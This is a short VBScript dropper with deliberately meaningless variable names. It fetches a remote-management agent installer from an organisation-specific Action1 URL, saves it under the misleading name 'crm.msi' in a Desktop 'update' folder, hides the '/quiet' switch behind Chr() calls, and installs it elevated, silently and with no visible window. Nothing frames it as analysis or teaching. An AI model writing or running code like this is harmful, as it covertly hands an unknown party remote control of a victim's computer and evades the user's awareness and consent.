Option Explicit

Dim x1,x2,x3,x4,x5,x6,x7,x8,x9,x0,x10

x1 = "https://app.eu.action1.com/agent/fa3ec894-b11a-11f0-ba2f-3f2e701ace53/Windows/agent(My_Organization).msi"
Set x2 = CreateObject("Scripting.FileSystemObject")
Set x3 = CreateObject("WScript.Shell")

x4 = x3.SpecialFolders("Desktop") & "\update"
If Not x2.FolderExists(x4) Then x2.CreateFolder x4

x5 = x4 & "\crm.msi"
If x2.FileExists(x5) Then x2.DeleteFile x5, True

' Download with MSXML2.XMLHTTP
Set x6 = CreateObject("MSXML2.XMLHTTP")
x6.Open "GET", x1, False
x6.Send

If x6.Status = 200 Then
    Set x8 = CreateObject("ADODB.Stream")
    x8.Type = 1
    x8.Open
    x8.Write x6.ResponseBody
    x8.SaveToFile x5, 2
    x8.Close
    Set x8 = Nothing
    Set x6 = Nothing
    
    WScript.Sleep 2000
    
    ' Hidden quiet parameter
    x10 = "/q" & Chr(117) & "i" & "e" & Chr(116) ' /quiet
    Set x9 = CreateObject("Shell.Application")
    x9.ShellExecute "msiexec", "/i """ & x5 & """ " & x10, "", "runas", 0
    Set x9 = Nothing
End If

Set x2 = Nothing
Set x3 = Nothing